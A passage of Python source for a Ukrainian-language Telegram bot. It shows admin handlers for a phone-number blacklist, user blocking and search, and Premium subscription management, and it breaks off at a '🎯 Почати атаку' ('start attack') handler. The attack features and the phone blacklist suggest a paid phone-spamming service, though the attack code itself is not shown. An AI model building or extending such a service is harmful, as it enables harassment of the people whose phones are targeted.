        await message.answer("Будь ласка, введіть номер телефону для додавання до чорного списку.\nПриклад: /block 380XXXXXXXXX")
        return
    
    phone = args.strip()
    
    if not re.match(r"^\d{12}$", phone):
        await message.answer("Номер повинен бути формату: 380ХХХХХХХХХ. Будь ласка, введіть номер повторно.")
        return

    try:
        async with db_pool.acquire() as conn:
            await conn.execute(
                "INSERT INTO blacklist (phone_number, blocked_by) VALUES ($1, $2) ON CONFLICT (phone_number) DO UPDATE SET blocked_by = $2",
                phone, user_id
            )
        await message.answer(f"Номер {phone} додано до чорного списку.")
    except Exception as e:
        await message.answer("Сталася помилка при додаванні номера до чорного списку.")
        print(f"Помилка: {e}")

@dp.message_handler(commands=['unblock'])
async def remove_from_blacklist(message: Message):
    user_id = message.from_user.id
    
    # Перевіряємо чи користувач має права (VIP або адмін)
    if not await check_vip_status(user_id) and user_id not in ADMIN:
        await message.answer("❌ Недостатньо прав для розблокування номера.")
        return
    
    args = message.get_args()
    
    if not args:
        await message.answer("Будь ласка, введіть номер телефону для видалення з чорного списку.\nПриклад: /unblock 380XXXXXXXXX")
        return
    
    phone = args.strip()
    
    if not re.match(r"^\d{12}$", phone):
        await message.answer("Номер повинен бути формату: 380ХХХХХХХХХ. Будь ласка, введіть номер повторно.")
        return

    try:
        async with db_pool.acquire() as conn:
            # Перевіряємо чи номер є в чорному списку та хто його заблокував
            blocked_info = await conn.fetchrow("SELECT blocked_by FROM blacklist WHERE phone_number = $1", phone)
            if not blocked_info:
                await message.answer(f"Номер {phone} не знайдено в чорному списку.")
                return
            
            blocked_by = blocked_info['blocked_by']
            
            # Перевіряємо чи користувач має права на розблокування
            # Адміни можуть розблоковувати будь-які номери
            # Користувачі можуть розблоковувати тільки свої номери
            if user_id not in ADMIN:
                if blocked_by is None:
                    # Старий запис без blocked_by - тільки адміни можуть розблокувати
                    await message.answer("❌ Цей номер може розблокувати тільки адміністратор.")
                    return
                elif blocked_by != user_id:
                    await message.answer("❌ Ви не можете розблокувати цей номер. Його може розблокувати тільки той, хто його заблокував.")
                    return
            
            # Видаляємо номер з чорного списку
            await conn.execute("DELETE FROM blacklist WHERE phone_number = $1", phone)
        await message.answer(f"✅ Номер {phone} видалено з чорного списку.")
    except Exception as e:
        await message.answer("❌ Сталася помилка при видаленні номера з чорного списку.")
        logging.error(f"Помилка при видаленні з чорного списку: {e}")

@dp.message_handler(commands=['nonstart'])
async def nonstart(message: Message):
    empty_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    await message.answer("Я ж сказав не натискати...", reply_markup=empty_keyboard)


@dp.message_handler(text="Заблокувати користувача")
async def block_user(message: Message):
    if message.from_user.id in ADMIN:
        await message.answer("🔴 <b>Блокування користувача</b>\n\nВведіть ID користувача для блокування:\n\n💡 Ви можете написати <b>Скасувати</b> для відміни.", parse_mode="html")
        await Dialog.block_user.set()
    else:
        await message.answer("Недостатньо прав.")

@dp.message_handler(state=Dialog.block_user)
async def process_block(message: Message, state: FSMContext):
    user_id = message.text.strip()
    
    # Перевіряємо на скасування
    if user_id.lower() in ['скасувати', 'отмена', 'отмінити', 'cancel']:
        await state.finish()
        await message.answer("❌ Операцію скасовано.", reply_markup=profile_keyboard)
        return
    
    if user_id.isdigit():
        user_id = int(user_id)
        async with db_pool.acquire() as conn:
            await conn.execute("UPDATE users SET block = $1 WHERE user_id = $2", 1, user_id)
        await message.answer(f"✅ Користувача з ID {user_id} заблоковано.", reply_markup=profile_keyboard)
    else:
        await message.answer("❌ Некоректний ID користувача.\n\nВведіть числовий ID або напишіть <b>Скасувати</b> для відміни.", parse_mode="html")
        return
    
    await state.finish()

@dp.message_handler(text="Розблокувати користувача")
async def unblock_user(message: Message):
    if message.from_user.id in ADMIN:
        await message.answer("🟢 <b>Розблокування користувача</b>\n\nВведіть ID користувача для розблокування:\n\n💡 Ви можете написати <b>Скасувати</b> для відміни.", parse_mode="html")
        await Dialog.unblock_user.set()
    else:
        await message.answer("Недостатньо прав.")

@dp.message_handler(state=Dialog.unblock_user)
async def process_unblock(message: Message, state: FSMContext):
    user_id = message.text.strip()
    
    # Перевіряємо на скасування
    if user_id.lower() in ['скасувати', 'отмена', 'отмінити', 'cancel']:
        await state.finish()
        await message.answer("❌ Операцію скасовано.", reply_markup=profile_keyboard)
        return
    
    if user_id.isdigit():
        user_id = int(user_id)
        async with db_pool.acquire() as conn:
            await conn.execute("UPDATE users SET block = $1 WHERE user_id = $2", 0, user_id)
        await message.answer(f"✅ Користувача з ID {user_id} розблоковано.", reply_markup=profile_keyboard)
    else:
        await message.answer("❌ Некоректний ID користувача.\n\nВведіть числовий ID або напишіть <b>Скасувати</b> для відміни.", parse_mode="html")
        return
    
    await state.finish()


@dp.message_handler(text="Пошук користувача")
async def search_user_start(message: Message):
    if message.from_user.id in ADMIN:
        await message.answer(
            "🔍 <b>Пошук користувача</b>\n\n"
            "Введіть для пошуку:\n"
            "• <b>ID користувача</b> (число)\n"
            "• <b>Username</b> (без @)\n"
            "• <b>Ім'я</b> (частина імені)\n\n"
            "💡 Ви можете написати <b>Скасувати</b> для відміни операції.",
            parse_mode="HTML"
        )
        await Dialog.search_user.set()
    else:
        await message.answer("Недостатньо прав.")

@dp.message_handler(state=Dialog.search_user)
async def search_user_process(message: Message, state: FSMContext):
    search_query = message.text.strip()
    
    # Перевіряємо на скасування
    if search_query.lower() in ['скасувати', 'отмена', 'отмінити', 'cancel']:
        await state.finish()
        await message.answer("❌ Операцію скасовано.", reply_markup=admin_keyboard)
        return
        
    try:
        async with db_pool.acquire() as conn:
            # Спробуємо знайти за user_id (якщо введено число)
            if search_query.isdigit():
                user_id = int(search_query)
                user = await conn.fetchrow(
                    'SELECT * FROM users WHERE user_id = $1',
                    user_id
                )
                if user:
                    await send_user_info(message, user, conn)
                    await state.finish()
                    return
            
            # Пошук за username (без @)
            username_query = search_query.lstrip('@')
            users_by_username = await conn.fetch(
                'SELECT * FROM users WHERE username ILIKE $1',
                f'%{username_query}%'
            )
            
            # Пошук за ім'ям
            users_by_name = await conn.fetch(
                'SELECT * FROM users WHERE name ILIKE $1',
                f'%{search_query}%'
            )
            
            # Об'єднуємо результати та видаляємо дублікати
            all_users = {}
            for user in users_by_username:
                all_users[user['user_id']] = user
            for user in users_by_name:
                all_users[user['user_id']] = user
            
            if not all_users:
                await message.answer(
                    f"❌ Користувачів не знайдено за запитом: <b>{search_query}</b>",
                    parse_mode="HTML"
                )
                await state.finish()
                return
            
            # Якщо знайдено одного користувача - показуємо детальну інформацію
            if len(all_users) == 1:
                user = list(all_users.values())[0]
                await send_user_info(message, user, conn)
            else:
                # Якщо знайдено кілька користувачів - показуємо список
                message_text = f"🔍 <b>Знайдено користувачів: {len(all_users)}</b>\n\n"
                for idx, user in enumerate(list(all_users.values())[:10], 1):  # Обмежуємо до 10
                    user_id = user['user_id']
                    name = user['name'] or "Без імені"
                    username = user['username'] or "Без username"
                    block_status = "🔴 Заблокований" if user['block'] == 1 else "🟢 Активний"
                    message_text += f"{idx}. <a href='tg://user?id={user_id}'>{name}</a> (@{username})\n"
                    message_text += f"   ID: <code>{user_id}</code> | {block_status}\n\n"
                
                if len(all_users) > 10:
                    message_text += f"... та ще {len(all_users) - 10} користувачів"
                
                await message.answer(message_text, parse_mode="HTML")
            
            await state.finish()
            
    except Exception as e:
        logging.error(f"Помилка при пошуку користувача: {e}")
        await message.answer(f"❌ Помилка при пошуку: {str(e)}", reply_markup=admin_keyboard)
        await state.finish()

async def send_user_info(message: Message, user: dict, conn):
    """Відправляє детальну інформацію про користувача"""
    user_id = user['user_id']
    name = user['name'] or "Без імені"
    username = user['username'] or "Без username"
    block_status = "🔴 Заблокований" if user['block'] == 1 else "🟢 Активний"
    vip_status = "⭐ Premium" if user.get('is_vip', False) else "❌ Без Premium"
    
    # Формуємо повідомлення
    info_text = f"👤 <b>Інформація про користувача</b>\n\n"
    info_text += f"🆔 <b>ID:</b> <code>{user_id}</code>\n"
    info_text += f"📛 <b>Ім'я:</b> {name}\n"
    info_text += f"📱 <b>Username:</b> @{username}\n"
    info_text += f"🔒 <b>Статус:</b> {block_status}\n"
    info_text += f"⭐ <b>Premium:</b> {vip_status}\n"
    
    # Додаємо інформацію про дату закінчення VIP
    if user.get('is_vip', False) and user.get('vip_expires_at'):
        expires_at = user['vip_expires_at']
        # PostgreSQL повертає datetime об'єкт
        if isinstance(expires_at, str):
            # Якщо це рядок, конвертуємо в datetime
            expires_at = datetime.strptime(expires_at, '%Y-%m-%d %H:%M:%S')
        # Якщо expires_at - це datetime з timezone, конвертуємо в naive для форматування
        if hasattr(expires_at, 'replace') and expires_at.tzinfo:
            expires_at = expires_at.replace(tzinfo=None)
        expires_date = expires_at.strftime('%d.%m.%Y %H:%M')
        info_text += f"📅 <b>Premium дійсний до:</b> {expires_date}\n"
    
    info_text += "\n"
    
    if user['last_attack_date']:
        info_text += f"📅 <b>Остання атака:</b> {user['last_attack_date']}\n"
    
    await message.answer(info_text, parse_mode="HTML", reply_markup=admin_keyboard)

@dp.message_handler(text="Видати віп")
async def give_vip_start(message: Message):
    if message.from_user.id in ADMIN:
        await message.answer(
            "⭐ <b>Видача Premium статусу</b>\n\n"
            "Введіть ID користувача, якому потрібно видати Premium статус:\n\n"
            "💡 Ви можете написати <b>Скасувати</b> для відміни операції.",
            parse_mode="HTML"
        )
        await Dialog.give_vip.set()
    else:
        await message.answer("Недостатньо прав.")

@dp.message_handler(state=Dialog.give_vip)
async def give_vip_process(message: Message, state: FSMContext):
    user_input = message.text.strip()
    
    # Перевіряємо на скасування
    if user_input.lower() in ['скасувати', 'отмена', 'отмінити', 'cancel']:
        await state.finish()
        await message.answer("❌ Операцію скасовано.", reply_markup=admin_keyboard)
        return
    
    # Перевіряємо чи введено число (ID користувача)
    if not user_input.isdigit():
        await message.answer("❌ Помилка! Введіть коректний ID користувача (тільки цифри).")
        return
    
    target_user_id = int(user_input)
    
    try:
        async with db_pool.acquire() as conn:
            # Перевіряємо чи користувач існує
            user = await conn.fetchrow('SELECT user_id, name, username, is_vip, vip_expires_at FROM users WHERE user_id = $1', target_user_id)
            
            if not user:
                # Якщо користувача немає в базі, додаємо його без VIP
                try:
                    chat = await bot.get_chat(target_user_id)
                    user_name = chat.first_name or "Без імені"
                    if chat.last_name:
                        user_name += f" {chat.last_name}"
                    user_username = chat.username or None
                    
                    # Додаємо користувача в базу без VIP
                    today = get_kyiv_date()
                    await conn.execute(
                        'INSERT INTO users (user_id, name, username, block, last_attack_date, is_vip) VALUES ($1, $2, $3, $4, $5, $6) ON CONFLICT (user_id) DO NOTHING',
                        target_user_id, user_name, user_username, 0, today, False
                    )
                    
                    # Отримуємо користувача з бази
                    user = await conn.fetchrow('SELECT user_id, name, username, is_vip, vip_expires_at FROM users WHERE user_id = $1', target_user_id)
                    
                    if not user:
                        await message.answer(
                            f"❌ Не вдалося додати користувача з ID <code>{target_user_id}</code> до бази даних.",
                            parse_mode="HTML"
                        )
                        await state.finish()
                        return
                    
                    # Повідомляємо адміна що користувач доданий
                    await message.answer(
                        f"✅ Користувач доданий до бази даних!\n\n"
                        f"👤 Користувач: <a href='tg://user?id={target_user_id}'>{user_name}</a>\n"
                        f"📱 Username: @{user_username if user_username else 'Без username'}\n"
                        f"🆔 ID: <code>{target_user_id}</code>\n\n"
                        f"💡 Тепер ви можете видати Premium цьому користувачу, введіть його ID знову.",
                        parse_mode="HTML",
                        reply_markup=admin_keyboard
                    )
                    await state.finish()
                    return
                except Exception as e:
                    logging.error(f"Помилка при отриманні інформації про користувача {target_user_id}: {e}")
                    await message.answer(
                        f"❌ Користувач з ID <code>{target_user_id}</code> не знайдений в базі даних і не доступний через Telegram API.\n\n"
                        f"Помилка: {str(e)}",
                        parse_mode="HTML"
                    )
                    await state.finish()
                    return

            # Розраховуємо дату закінчення VIP (30 днів від поточної дати)
            vip_expires_at = get_kyiv_datetime() + timedelta(days=30)
            
            # Перевіряємо чи вже має VIP
            if user['is_vip']:
                # Якщо VIP вже є, продовжуємо його ще на 30 днів
                await conn.execute(
                    'UPDATE users SET is_vip = TRUE, vip_expires_at = $1 WHERE user_id = $2',
                    vip_expires_at, target_user_id
                )
                name = user['name'] or "Без імені"
                username = user['username'] or "Без username"
                expires_date = vip_expires_at.strftime('%d.%m.%Y %H:%M')
                await message.answer(
                    f"✅ Premium статус продовжено!\n\n"
                    f"👤 Користувач: <a href='tg://user?id={target_user_id}'>{name}</a> (@{username})\n"
                    f"🆔 ID: <code>{target_user_id}</code>\n"
                    f"📅 Premium дійсний до: {expires_date}",
                    parse_mode="HTML",
                    reply_markup=admin_keyboard
                )
                
                # Повідомляємо користувача з панеллю кнопок
                try:
                    expires_date_formatted = vip_expires_at.strftime('%d.%m.%Y %H:%M')
                    await bot.send_message(
                        target_user_id,
                        f"⏰ <b>Premium статус продовжено!</b>\n\n"
                        f"Ваш Premium статус продовжено на 30 днів.\n"
                        f"📅 Premium дійсний до: {expires_date_formatted}",
                        parse_mode="HTML",
                        reply_markup=profile_keyboard
                    )
                except Exception as e:
                    logging.error(f"Не вдалося відправити повідомлення користувачу {target_user_id}: {e}")
                
                await state.finish()
                return
            
            # Видаємо VIP статус на 30 днів
            await conn.execute(
                'UPDATE users SET is_vip = TRUE, vip_expires_at = $1 WHERE user_id = $2',
                vip_expires_at, target_user_id
            )
            
            name = user['name'] or "Без імені"
            username = user['username'] or "Без username"
            
            # Форматуємо дату закінчення
            expires_date = vip_expires_at.strftime('%d.%m.%Y %H:%M')
            
            # Повідомляємо адміна
            await message.answer(
                f"✅ Premium статус успішно видано!\n\n"
                f"👤 Користувач: <a href='tg://user?id={target_user_id}'>{name}</a> (@{username})\n"
                f"🆔 ID: <code>{target_user_id}</code>\n"
                f"📅 Premium дійсний до: {expires_date}",
                parse_mode="HTML",
                reply_markup=admin_keyboard
            )
            
            # Повідомляємо користувача з панеллю кнопок
            try:
                expires_date_formatted = vip_expires_at.strftime('%d.%m.%Y %H:%M')
                await bot.send_message(
                    target_user_id,
                    f"🎉 <b>Вітаємо!</b>\n\n"
                    f"Вам надано Premium статус!\n"
                    f"📅 Premium дійсний до: {expires_date_formatted}\n\n"
                    f"Тепер ви можете повною мірою користуватися ботом.",
                    parse_mode="HTML",
                    reply_markup=profile_keyboard
                )
            except Exception as e:
                logging.error(f"Не вдалося відправити повідомлення користувачу {target_user_id}: {e}")
            
            await state.finish()
            
    except Exception as e:
        logging.error(f"Помилка при видачі VIP: {e}")
        await message.answer(f"❌ Помилка при видачі Premium: {str(e)}", reply_markup=admin_keyboard)
        await state.finish()


@dp.message_handler(text="Видати віп на 12 годин")
async def give_vip_12h_start(message: Message):
    if message.from_user.id in ADMIN:
        await message.answer(
            "⏳ <b>Видача Premium на 12 годин</b>\n\n"
            "Введіть ID користувача, якому потрібно видати Premium статус на 12 годин:\n\n"
            "💡 Ви можете написати <b>Скасувати</b> для відміни операції.",
            parse_mode="HTML"
        )
        await Dialog.give_vip_12h.set()
    else:
        await message.answer("Недостатньо прав.")


@dp.message_handler(state=Dialog.give_vip_12h)
async def give_vip_12h_process(message: Message, state: FSMContext):
    user_input = message.text.strip()
    
    if user_input.lower() in ['скасувати', 'отмена', 'отмінити', 'cancel']:
        await state.finish()
        await message.answer("❌ Операцію скасовано.", reply_markup=admin_keyboard)
        return
    
    if not user_input.isdigit():
        await message.answer("❌ Помилка! Введіть коректний ID користувача (тільки цифри).")
        return
    
    target_user_id = int(user_input)
    
    try:
        async with db_pool.acquire() as conn:
            user = await conn.fetchrow('SELECT user_id, name, username, is_vip, vip_expires_at FROM users WHERE user_id = $1', target_user_id)
            user_added = False
            
            if not user:
                try:
                    chat = await bot.get_chat(target_user_id)
                    user_name = chat.first_name or "Без імені"
                    if chat.last_name:
                        user_name += f" {chat.last_name}"
                    user_username = chat.username or None
                    
                    today = get_kyiv_date()
                    await conn.execute(
                        'INSERT INTO users (user_id, name, username, block, last_attack_date, is_vip) VALUES ($1, $2, $3, $4, $5, $6) ON CONFLICT (user_id) DO NOTHING',
                        target_user_id, user_name, user_username, 0, today, False
                    )
                    
                    user = await conn.fetchrow('SELECT user_id, name, username, is_vip, vip_expires_at FROM users WHERE user_id = $1', target_user_id)
                    
                    if not user:
                        await message.answer(
                            f"❌ Не вдалося додати користувача з ID <code>{target_user_id}</code> до бази даних.",
                            parse_mode="HTML",
                            reply_markup=admin_keyboard
                        )
                        await state.finish()
                        return
                    
                    user_added = True
                except Exception as e:
                    logging.error(f"Помилка при отриманні інформації про користувача {target_user_id}: {e}")
                    await message.answer(
                        f"❌ Користувач з ID <code>{target_user_id}</code> не знайдений в базі даних і не доступний через Telegram API.\n\n"
                        f"Помилка: {str(e)}",
                        parse_mode="HTML",
                        reply_markup=admin_keyboard
                    )
                    await state.finish()
                    return
            
            now = get_kyiv_datetime()
            current_expires = user['vip_expires_at']
            if current_expires and isinstance(current_expires, str):
                current_expires = datetime.strptime(current_expires, '%Y-%m-%d %H:%M:%S')
            if current_expires and hasattr(current_expires, 'replace'):
                current_expires = current_expires.replace(tzinfo=None)
            
            vip_active = False
            if user['is_vip']:
                if not current_expires or current_expires > now:
                    vip_active = True
            
            if vip_active:
                expires_str = current_expires.strftime('%d.%m.%Y %H:%M') if current_expires else "безстроково"
                await message.answer(
                    "ℹ️ У користувача вже активний Premium статус.\n\n"
                    f"📅 Дійсний до: {expires_str}\n"
                    "Для повторної видачі спочатку зніміть поточний статус.",
                    parse_mode="HTML",
                    reply_markup=admin_keyboard
                )
                await state.finish()
                return
            
            vip_expires_at = now + timedelta(hours=12)
            
            await conn.execute(
                'UPDATE users SET is_vip = TRUE, vip_expires_at = $1 WHERE user_id = $2',
                vip_expires_at, target_user_id
            )
            
            name = user['name'] or "Без імені"
            username = user['username'] or "Без username"
            expires_date = vip_expires_at.strftime('%d.%m.%Y %H:%M')
            
            admin_message = (
                "✅ Premium статус успішно видано на 12 годин!\n\n"
                f"👤 Користувач: <a href='tg://user?id={target_user_id}'>{name}</a> (@{username})\n"
                f"🆔 ID: <code>{target_user_id}</code>\n"
                f"📅 Premium дійсний до: {expires_date}"
            )
            
            if user_added:
                admin_message = (
                    "ℹ️ Користувача не було в базі даних — запис створено автоматично.\n\n"
                    + admin_message
                )
            
            await message.answer(admin_message, parse_mode="HTML", reply_markup=admin_keyboard)
            
            try:
                await bot.send_message(
                    target_user_id,
                    "🎉 <b>Вітаємо!</b>\n\n"
                    "Вам надано Premium статус на 12 годин!\n"
                    f"📅 Premium дійсний до: {expires_date}",
                    parse_mode="HTML",
                    reply_markup=profile_keyboard
                )
            except Exception as e:
                logging.error(f"Не вдалося відправити повідомлення користувачу {target_user_id}: {e}")
        
        await state.finish()
    
    except Exception as e:
        logging.error(f"Помилка при видачі VIP на 12 годин: {e}")
        await message.answer(f"❌ Помилка при видачі Premium на 12 годин: {str(e)}", reply_markup=admin_keyboard)
        await state.finish()


@dp.message_handler(text="Продлити віп")
async def extend_vip_start(message: Message):
    if message.from_user.id in ADMIN:
        await message.answer(
            "⏰ <b>Продовження Premium статусу</b>\n\n"
            "Введіть ID користувача, у якого потрібно продовжити Premium статус на 30 днів:\n\n"
            "💡 Ви можете написати <b>Скасувати</b> для відміни операції.\n"
            "💡 Операцію можна виконувати декілька разів для продовження терміну.",
            parse_mode="HTML"
        )
        await Dialog.extend_vip.set()
    else:
        await message.answer("Недостатньо прав.")

@dp.message_handler(state=Dialog.extend_vip)
async def extend_vip_process(message: Message, state: FSMContext):
    user_input = message.text.strip()
    
    # Перевіряємо на скасування
    if user_input.lower() in ['скасувати', 'отмена', 'отмінити', 'cancel']:
        await state.finish()
        await message.answer("❌ Операцію скасовано.", reply_markup=admin_keyboard)
        return
    
    # Перевіряємо чи введено число (ID користувача)
    if not user_input.isdigit():
        await message.answer("❌ Помилка! Введіть коректний ID користувача (тільки цифри).")
        return
    
    target_user_id = int(user_input)
    
    try:
        async with db_pool.acquire() as conn:
            # Перевіряємо чи користувач існує
            user = await conn.fetchrow('SELECT user_id, name, username, is_vip, vip_expires_at FROM users WHERE user_id = $1', target_user_id)
            
            if not user:
                await message.answer(
                    f"❌ Користувач з ID <code>{target_user_id}</code> не знайдений в базі даних.",
                    parse_mode="HTML"
                )
                await state.finish()
                return
            
            # Отримуємо поточну дату закінчення VIP або встановлюємо поточну дату
            now = get_kyiv_datetime()
            if user['vip_expires_at'] and user['is_vip']:
                # Якщо VIP вже активний, продовжуємо від поточної дати закінчення
                current_expires = user['vip_expires_at']
                if isinstance(current_expires, str):
                    current_expires = datetime.strptime(current_expires, '%Y-%m-%d %H:%M:%S')
                if hasattr(current_expires, 'replace'):
                    current_expires = current_expires.replace(tzinfo=None)
                # Якщо дата закінчення в майбутньому, продовжуємо від неї
                if current_expires > now:
                    # Додаємо 31 день, щоб отримати той самий день наступного місяця (30 днів + 1 для точності)
                    # Це гарантує, що користувач отримає повні 30 днів
                    vip_expires_at = current_expires + timedelta(days=31)
                else:
                    # Якщо VIP вже закінчився, встановлюємо від поточної дати
                    vip_expires_at = now + timedelta(days=30)
            else:
                # Якщо VIP не активний, встановлюємо від поточної дати
                vip_expires_at = now + timedelta(days=30)
            
            # Оновлюємо VIP статус
            await conn.execute(
                'UPDATE users SET is_vip = TRUE, vip_expires_at = $1 WHERE user_id = $2',
                vip_expires_at, target_user_id
            )
            
            name = user['name'] or "Без імені"
            username = user['username'] or "Без username"
            expires_date = vip_expires_at.strftime('%d.%m.%Y %H:%M')
            
            # Повідомляємо адміна
            await message.answer(
                f"✅ Premium статус продовжено на 30 днів!\n\n"
                f"👤 Користувач: <a href='tg://user?id={target_user_id}'>{name}</a> (@{username})\n"
                f"🆔 ID: <code>{target_user_id}</code>\n"
                f"📅 Premium дійсний до: {expires_date}",
                parse_mode="HTML",
                reply_markup=admin_keyboard
            )
            
            # Повідомляємо користувача
            try:
                await bot.send_message(
                    target_user_id,
                    f"⏰ <b>Premium статус продовжено!</b>\n\n"
                    f"Ваш Premium статус продовжено на 30 днів.\n"
                    f"📅 Premium дійсний до: {expires_date}",
                    parse_mode="HTML",
                    reply_markup=profile_keyboard
                )
            except Exception as e:
                logging.error(f"Не вдалося відправити повідомлення користувачу {target_user_id}: {e}")
            
            await state.finish()
            
    except Exception as e:
        logging.error(f"Помилка при продовженні VIP: {e}")
        await message.answer(f"❌ Помилка при продовженні Premium: {str(e)}", reply_markup=admin_keyboard)
        await state.finish()

@dp.message_handler(text="Усі користувачі")
async def all_vip_users(message: Message):
    if message.from_user.id not in ADMIN:
        await message.answer("Недостатньо прав.")
        return
    
    try:
        async with db_pool.acquire() as conn:
            # Отримуємо всіх користувачів з VIP статусом
            vip_users = await conn.fetch('''
                SELECT user_id, name, username, is_vip, vip_expires_at 
                FROM users 
                WHERE is_vip = TRUE 
                ORDER BY vip_expires_at DESC NULLS LAST, user_id
            ''')
            
            if not vip_users:
                await message.answer(
                    "📋 <b>Список Premium користувачів</b>\n\n"
                    "На даний момент немає користувачів з Premium статусом.",
                    parse_mode="HTML",
                    reply_markup=admin_keyboard
                )
                return
            
            # Формуємо повідомлення з інформацією про всіх VIP користувачів
            now = get_kyiv_datetime()
            message_text = f"📋 <b>Список Premium користувачів</b>\n\n"
            message_text += f"Всього користувачів з Premium: <b>{len(vip_users)}</b>\n\n"
            
            # Розбиваємо на частини, якщо користувачів багато (Telegram має обмеження на довжину повідомлення)
            user_list = []
            for user in vip_users:
                user_id = user['user_id']
                name = user['name'] or "Без імені"
                username = user['username'] or "Без username"
                expires_at = user['vip_expires_at']
                
                # Форматуємо дату закінчення
                if expires_at:
                    if isinstance(expires_at, str):
                        expires_at = datetime.strptime(expires_at, '%Y-%m-%d %H:%M:%S')
                    if hasattr(expires_at, 'replace'):
                        expires_at = expires_at.replace(tzinfo=None)
                    expires_str = expires_at.strftime('%d.%m.%Y %H:%M')
                    if expires_at < now:
                        expires_str += " ⚠️ (закінчився)"
                else:
                    expires_str = "Без обмеження"
                
                user_info = (
                    f"👤 <a href='tg://user?id={user_id}'>{name}</a> (@{username})\n"
                    f"🆔 ID: <code>{user_id}</code>\n"
                    f"📅 Premium до: {expires_str}\n"
                )
                user_list.append(user_info)
            
            # Відправляємо повідомлення частинами, якщо воно занадто довге
            current_message = message_text
            for user_info in user_list:
                if len(current_message + user_info) > 4000:
                    # Відправляємо поточне повідомлення
                    await message.answer(current_message, parse_mode="HTML", reply_markup=admin_keyboard)
                    current_message = user_info
                else:
                    current_message += "\n" + user_info
            
            # Відправляємо останнє повідомлення
            if current_message != message_text:
                await message.answer(current_message, parse_mode="HTML", reply_markup=admin_keyboard)
            else:
                await message.answer(message_text, parse_mode="HTML", reply_markup=admin_keyboard)
            
    except Exception as e:
        logging.error(f"Помилка при отриманні списку VIP користувачів: {e}")
        await message.answer(
            f"❌ Помилка при отриманні списку Premium користувачів: {str(e)}",
            reply_markup=admin_keyboard
        )

@dp.message_handler(text="Забрати віп")
async def remove_vip_start(message: Message):
    if message.from_user.id in ADMIN:
        await message.answer(
            "🔴 <b>Забір Premium статусу</b>\n\n"
            "Введіть ID користувача, у якого потрібно забрати Premium статус:\n\n"
            "💡 Ви можете написати <b>Скасувати</b> для відміни операції.",
            parse_mode="HTML"
        )
        await Dialog.remove_vip.set()
    else:
        await message.answer("Недостатньо прав.")

@dp.message_handler(state=Dialog.remove_vip)
async def remove_vip_process(message: Message, state: FSMContext):
    user_input = message.text.strip()
    
    # Перевіряємо на скасування
    if user_input.lower() in ['скасувати', 'отмена', 'отмінити', 'cancel']:
        await state.finish()
        await message.answer("❌ Операцію скасовано.", reply_markup=admin_keyboard)
        return
    
    # Перевіряємо чи введено число (ID користувача)
    if not user_input.isdigit():
        await message.answer("❌ Помилка! Введіть коректний ID користувача (тільки цифри).")
        return
    
    target_user_id = int(user_input)
    
    try:
        async with db_pool.acquire() as conn:
            # Перевіряємо чи користувач існує
            user = await conn.fetchrow('SELECT user_id, name, username, is_vip FROM users WHERE user_id = $1', target_user_id)
            
            if not user:
                await message.answer(
                    f"❌ Користувач з ID <code>{target_user_id}</code> не знайдений в базі даних.",
                    parse_mode="HTML"
                )
                await state.finish()
                return
            
            # Перевіряємо чи має VIP
            if not user['is_vip']:
                name = user['name'] or "Без імені"
                username = user['username'] or "Без username"
                await message.answer(
                    f"ℹ️ Користувач <a href='tg://user?id={target_user_id}'>{name}</a> (@{username}) не має Premium статусу.",
                    parse_mode="HTML",
                    reply_markup=admin_keyboard
                )
                await state.finish()
                return
            
            # Забираємо VIP статус
            await conn.execute(
                'UPDATE users SET is_vip = FALSE, vip_expires_at = NULL WHERE user_id = $1',
                target_user_id
            )
            
            name = user['name'] or "Без імені"
            username = user['username'] or "Без username"
            
            # Повідомляємо адміна
            await message.answer(
                f"✅ Premium статус успішно забрано!\n\n"
                f"👤 Користувач: <a href='tg://user?id={target_user_id}'>{name}</a> (@{username})\n"
                f"🆔 ID: <code>{target_user_id}</code>",
                parse_mode="HTML",
                reply_markup=admin_keyboard
            )
            
            # Повідомляємо користувача
            try:
                await bot.send_message(
                    target_user_id,
                    "🔒 <b>Premium статус забрано</b>\n\n"
                    "Ваш Premium статус було припинено адміністратором.",
                    parse_mode="HTML"
                )
            except Exception as e:
                logging.error(f"Не вдалося відправити повідомлення користувачу {target_user_id}: {e}")
            
            await state.finish()
            
    except Exception as e:
        logging.error(f"Помилка при забранні VIP: {e}")
        await message.answer(f"❌ Помилка при забранні Premium: {str(e)}", reply_markup=admin_keyboard)
        await state.finish()

@dp.message_handler(text="Назад")
async def back_to_admin_menu(message: Message):
    if message.from_user.id in ADMIN:
        await message.answer('Ви повернулись до головного меню.', reply_markup=profile_keyboard)
    else:
        await message.answer('Ви не є адміном.')

@dp.message_handler(text='🆘 Допомога')
@dp.throttled(anti_flood, rate=3)
async def help(message: types.Message):
    # Перевіряємо, що повідомлення з особистого чату
    if message.chat.type != 'private':
        return
    
    user_id = message.from_user.id
    
    if not await user_exists(user_id):
        await message.answer("Для використання бота потрібно натиснути /start")
        return
    
    async with db_pool.acquire() as conn:
        result = await conn.fetchrow("SELECT block FROM users WHERE user_id = $1", user_id)
    
    if result and result['block'] == 1:
        await message.answer("Вас заблоковано і ви не можете користуватися ботом.")
        return
    
    if not await check_subscription_status(user_id):
        await message.answer("Ви відписалися від каналу. Підпишіться, щоб продовжити використання бота.", reply_markup=checkSubMenu)
        return
    
    if not await check_vip_status(user_id):
        await message.answer(
            "🔒 <b>Premium доступ недоступний</b>\n\n"
            "На жаль, у вас немає Premium статусу для використання бота.\n"
            "Для отримання доступу зверніться до адміністратора.",
            parse_mode="HTML"
        )
        return
    
    inline_keyboard = types.InlineKeyboardMarkup()
    code_sub = types.InlineKeyboardButton(text='🎪 Канал', url='https://t.me/+tod0WSFEpEQ2ODcy')
    inline_keyboard = inline_keyboard.add(code_sub)
    await bot.send_message(message.chat.id, "Виникли питання або знайшли проблему? Звертайся до @Nobysss", disable_web_page_preview=True, parse_mode="HTML", reply_markup=inline_keyboard)


@dp.message_handler(text='🎯 Почати атаку')
@dp.throttled(anti_flood, rate=3)
async def start_attack_prompt(message: Message):
    # Перевіряємо, що повідомлення з особистого чату
    if message.chat.type != 'private':
        return  # Ігноруємо повідомлення з груп
    
    user_id = message.from_user.id
    
    if not await user_exists(user_id):
        await message.answer("Для використання бота потрібно натиснути /start")
        return
    
    async with db_pool.acquire() as conn:
        result = await conn.fetchrow("SELECT block FROM users WHERE user_id = $1", user_id)
    
    if result and result['block'] == 1:
        await message.answer("Вас заблоковано і ви не можете користуватися ботом.")
        return
    
    if not await check_subscription_status(user_id):
        await message.answer("Ви відписалися від каналу. Підпишіться, щоб продовжити використання бота.", reply_markup=checkSubMenu)
        return
    
    if not await check_vip_status(user_id):
        await message.answer(
